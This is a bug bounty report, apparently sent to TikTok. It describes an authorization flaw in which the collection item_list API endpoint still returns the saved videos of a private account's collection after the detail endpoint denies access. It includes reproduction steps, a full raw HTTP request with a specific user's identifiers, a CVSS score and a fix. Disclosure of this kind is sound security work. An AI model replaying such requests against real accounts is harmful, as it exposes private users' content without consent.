**Program:** Tiktok  **Asset:** tiktok.com  **Weakness:** Information Disclsure

**Title:** Private Account Collection Items Disclosure via API Endpoint

## Description:

TikTok allows users to create collections of saved videos and optionally make them public. When a user switches their account from public to private, access to their collections should be restricted to approved followers only.

This restriction is correctly enforced in some areas:
- The collection cannot be accessed via the UI
- The `/api/collection/detail/` endpoint denies access

However, the `/api/collection/item_list/` endpoint does not enforce the same authorization checks and continues to return the list of videos within the collection.

This creates an inconsistency where:
- The collection (parent resource) is protected
- The collection contents (child resource) remain exposed

---

## Steps to Reproduce
1. Using **Account A**:
   - Create a collection
     <img width="959" height="449" alt="Screenshot 2026-03-27 045401" src="https://github.com/user-attachments/assets/46ddfefd-4308-40ec-bbda-2a0f6e10af4d" />
   - Add videos to the collection
   - Set the collection visibility to **public**
<img width="425" height="370" alt="Screenshot 2026-03-27 045425" src="https://github.com/user-attachments/assets/cf41dccf-4c7e-444a-ad61-d799d1c1f6cc" />

2. As Account B Copy the collection link and extract the `collectionId`

3. Using **Account B** (not following Account A):
   - Access the collection → works (since public)
4. Using **Account A**:
   - Change the account to **private**
5. Using **Account B**:
   - Attempt to access the collection via UI → **Access denied**
     <img width="1919" height="950" alt="Screenshot 2026-03-27 045225" src="https://github.com/user-attachments/assets/ed89e2e1-d4c0-4711-a30e-aff70c73c94e" />

   - Send request:
     ```
     GET /api/collection/detail/?collectionId=<collectionId>
     ```
     → **Access denied**
**(Meaning only Friends of the private account can access the collection)**
6. Now Send the request below:
```
GET /api/collection/item_list/?WebIdLastTime=1770339744&aid=1988&app_language=en&app_name=tiktok_web&browser_language=en-GB&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36&channel=tiktok_web&clientABVersions=70508271%2C72437276%2C73720541%2C75004379%2C75294819%2C75308229%2C75331216%2C75381397%2C75383830%2C75388125%2C75428706%2C75436983%2C75492093%2C75580040%2C75583892%2C75615158%2C75616570%2C75617643%2C75635433%2C75636449%2C75637792%2C75638198%2C75647181%2C75654773%2C75662098%2C75665224%2C75669895%2C75675273%2C75677772%2C75694122%2C75694604%2C75704990%2C75709820%2C75710427%2C75710568%2C75719512%2C75720100%2C75727052%2C75732666%2C75744130%2C75765321%2C75766107%2C70138197%2C70156809%2C70405643%2C71057832%2C71200802%2C71381811%2C71516509%2C71803300%2C71962127%2C72360691%2C72408100%2C72854054%2C72892778%2C73004916%2C73171280%2C73208420%2C73989921%2C74276218%2C74844724%2C75330961&collectionId=7621774240756648722&cookie_enabled=true&count=30&cursor=0&data_collection_enabled=true&device_id=7603551270141756929&device_platform=web_pc&focus_state=true&from_page=user&history_len=1&is_fullscreen=false&is_page_visible=true&language=en&odinId=7603550436969546770&os=windows&priority_region=NG&referer=&region=NG&screen_height=720&screen_width=1280&sourceType=113&tz_name=Africa%2FLagos&user_is_login=true&webcast_language=en HTTP/2
Host: www.tiktok.com
Cookie: [REDACTED]
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.tiktok.com/@guywonn/collection/Ty-7621774240756648722?_d=secCgYIASAHKAESPgo8QzsY3kjFdqCZtcKqiALFmkiJ9%2BoFmetkPAf%2BHXJwqZTanKKfGZ8qcJyPDD%2BHC%2FDeUpORj8mx5jcADmuzGgA%3D&_r=1&_svg=1&checksum=5d897642e359ea0011732cd85a52874e2c996f6e84d245a2534866a9bb5d3927&language=en&sec_user_id=MS4wLjABAAAA8_8gvJdSL33HOMUzfVZ37TQyrl7shHjZcpfx-cBOfvLiSIz-7UTmMilr9lxmZEtS&share_app_id=1233&share_link_id=94DCCD1C-1472-45C2-A175-9AC412074B90&share_region=NG&social_share_type=24&timestamp=1774582883&tt_from=copy&u_code=f1m328hhe2kg85&ug_btm=b5836%2Cb0&user_id=7603550436969546770&utm_campaign=client_share&utm_medium=ios&utm_source=copy
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
```
7. Observe that:
- The request succeeds
- The response returns a list of videos in the collection

---

## Impact

An attacker can bypass TikTok’s privacy controls and retrieve the contents of collections belonging to private accounts.

Even though the collection itself is no longer accessible, the `/api/collection/item_list/` endpoint exposes the list of saved videos, resulting in unauthorized disclosure of user-curated content.

This violates the expected privacy boundaries of private accounts and may expose sensitive or personal user interests.

## Recommendation

Ensure consistent authorization checks across all collection-related endpoints.

Specifically:
- Enforce access control on `/api/collection/item_list/`
- Validate requester permissions based on:
  - Account privacy settings
  - Follower relationship
---

## Severity
**CVSS v3.0 Base Score:** 5.9 → Medium  

| Metric | Value |
|--------|-------|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | Low |
| Integrity (I) | None |
| Availability (A) | None |

---
